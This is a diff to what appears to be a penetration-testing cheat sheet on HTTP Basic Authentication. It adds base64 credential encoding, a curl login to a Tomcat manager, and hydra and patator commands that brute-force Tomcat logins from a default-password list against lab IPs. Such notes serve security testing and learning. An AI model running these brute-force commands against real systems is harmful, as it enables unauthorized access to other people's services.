@@ -24,22 +24,46 @@ curl -X POST -d 'username=testing123&password=test123&confirm=test123' http://vi
 
 ### HTTP Basic Authentication
 
-HTTP Basic Authentication with Hydra:
+Decode
+
+```bash
+❯ echo -n 'dG9tY2F0OnMzY3JldA==' | base64 -d
+tomcat:s3cret
+```
+
+Encode
+
+```bash
+❯ echo -n 'tomcat:s3cret' | base64
+dG9tY2F0OnMzY3JldA==
+```
+
+#### Using HTTP Authentication
+
+We can authenticate with curl:
+
+```bash
+curl -s -X GET http://10.10.10.95:8080/manager/html -H 'Authorization: Basic dG9tY2F0OnMzY3JldA==' -H 'Cookie: JSESSIONID=3AF413E376448C04207FC529CF694B62'
+```
+
+#### Bruteforce HTTP Basic Authentication
+
+hydra:
+
+```bash
+HYDRA_PROXY_HTTP=http://127.0.0.1:8080 hydra -C /opt/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -s 8080 10.10.10.95 http-get /manager/html
+```
+
+patator:
+
+```bash
+patator http_fuzz auth_type=basic url=http://10.10.10.95:8080/manager/html user_pass=FILE0 0=/opt/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -x ignore:code=401
+```
+
+hydra without proxy:
 
 ```text
 hydra -C /opt/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.10.10.10:8080/manager/html
-```
-
-See the base64 value:
-
-```bash
-echo -n 'admin:admin' | base64
-```
-
-Authenticate with curl with valid credentials:
-
-```bash
-curl http://10.10.10.101:8080 -H "Authorization: Basic YWRtaW46YWRtaW4=" -I
 ```
 
 ### Enumerating Usernames via Error Messages
